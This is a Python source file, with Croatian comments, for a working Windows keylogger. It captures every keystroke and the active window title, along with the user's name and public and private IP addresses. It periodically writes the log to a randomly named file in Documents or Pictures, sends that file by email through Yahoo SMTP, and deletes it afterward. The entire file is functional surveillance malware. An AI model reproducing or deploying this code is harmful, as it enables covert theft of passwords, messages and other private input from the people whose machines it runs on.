from fileinput import filename
from logging.config import listen
from operator import sub
from typing import List
import win32gui
from pynput.keyboard import Key, Listener
import time
import os
import random
import requests
import socket

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import config
import threading

javniIP = requests.get('https://api.ipify.org').text
privatniIP = socket.gethostbyname(socket.gethostname())
#Korisnicko ime
osKorisnik = os.path.expanduser('~').split('\\')[2]
#Datum i vrijeme
datumVrijeme = time.ctime(time.time())
#Poruka pri kreiranju zapisa
poruka = f'[Početak zapisa]\n  *~ Datum vrijeme: {datumVrijeme}\n  *~ OS korisnik: {osKorisnik}\n  *~ Javni-IP: {javniIP}\n  *~ Privatni-IP: {privatniIP}\n\n'

podaci = []
podaci.append(poruka)
staraApp = ''
datotekaZaBrisanje = []

def on_press(tipka):
    global staraApp

    #Pronalazi koji window se koristi
    novaApp = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    if novaApp == 'Cortana':
        novaApp = 'Windows start menu'
    else:
        pass
    #Ako se koristi window koji nije u stariApp onda upisujemo u podatke
    if novaApp != staraApp and novaApp != '':
        datVri = time.ctime(time.time())
        podaci.append(f'\n[{datVri}] ~ {novaApp}\n')
        staraApp = novaApp
    else:
        pass
    #Mijenjam ostale tipke za bolju citljivost
    ostaleTipke = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
	'Key.alt_l', '[ALT]','Key.alt', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

    tipka = str(tipka).strip('\'')
    if tipka in ostaleTipke:
        #Ako stisnem enter pomeknu bude index za 1 tak da se ispisuje [ENTER]\n
        podaci.append(ostaleTipke[ostaleTipke.index(tipka)+1])
    else:
        podaci.append(tipka)

#Kreira datoteku u direktoriju Documents ili Pictures. Daje random naziv .txt datoteci
#U datoteku upisuje sve podatke koji su u listi podataka
def kreirajDatoteku(brojac):
    prviDirektorij = os.path.expanduser('~') + "\\Documents\\"
    drugiDirektorij = os.path.expanduser('~') + "\\Pictures\\"
    listaDirektorija = [prviDirektorij, drugiDirektorij]
    putanja = random.choice(listaDirektorija)
    nazivDatoteke = str(brojac) + 'I' + str(random.randint(1000000, 9999999)) + '.txt'
    putanjaDatoteke = putanja + nazivDatoteke
    print('Pisem u:' + putanjaDatoteke)
    datotekaZaBrisanje.append(putanjaDatoteke)
    with open(putanjaDatoteke, 'w', encoding="utf-8") as fp:
        fp.write(''.join(podaci))

#Funkcija spava koliko je sekundi odredeno u konfiguraciji
#Uzima lozinku i mail iz konfiguracije te sa tog maila na taj mail podatke putem TLS-a
#Nakon što su podaci poslani na mail, datoteka se briše iz direktorija te povecava brojac datoteka za trenutnog korisnika
def posaljiDatoteku():
    brojac = 0
    odAdresa = config.email
    odLozinka = config.lozinka
    vrijemeSpavanja = config.vrijemeSpavanja
    toAddr = odAdresa
    time.sleep(vrijemeSpavanja)
    while True:
        if len(podaci) > 1:
            try:
                    kreirajDatoteku(brojac)
                    naslovMajla = f'[{osKorisnik}] ~ {brojac}'
                    mailPodaci = MIMEMultipart()
                    mailPodaci['From'] = odAdresa
                    mailPodaci['To'] = toAddr
                    mailPodaci['Subject'] = naslovMajla
                    sadrzaj = 'Keylogger podaci'
                    mailPodaci.attach(MIMEText(sadrzaj, 'plain'))
                    dodanaDatoteka = open(datotekaZaBrisanje[0], 'rb')
                    nazivDatoteke = datotekaZaBrisanje[0].split('\\')[4]
                    print("Kreirana datoteka: "+nazivDatoteke)
                    mailHeaderi = MIMEBase('application','octect-stream')
                    mailHeaderi.set_payload((dodanaDatoteka).read())
                    encoders.encode_base64(mailHeaderi)
                    mailHeaderi.add_header('content-disposition','attachment;filename='+str(nazivDatoteke))
                    mailPodaci.attach(mailHeaderi)
                    tekst = mailPodaci.as_string()
                    smtpMail = smtplib.SMTP("smtp.mail.yahoo.com",587)
                    smtpMail.ehlo()
                    #tls
                    smtpMail.starttls()
                    smtpMail.ehlo()
                    smtpMail.login(odAdresa, odLozinka)
                    smtpMail.sendmail(odAdresa, toAddr, tekst)
                    dodanaDatoteka.close()
                    smtpMail.close()
                    os.remove(datotekaZaBrisanje[0])
                    del podaci[1:]
                    del datotekaZaBrisanje[0:]
                    brojac += 1
                    time.sleep(vrijemeSpavanja)
            except Exception as e:
                print(e)
                pass
#Main funkcija kreira dretvu i slusac koji se aktivira kada se pritisne neka tipka na tipkovnici
if __name__ == '__main__':
    print("Pokrecem aplikaciju...")
    t1 = threading.Thread(target=posaljiDatoteku)
    t1.start()

    with Listener(on_press=on_press) as slusac:
        slusac.join()




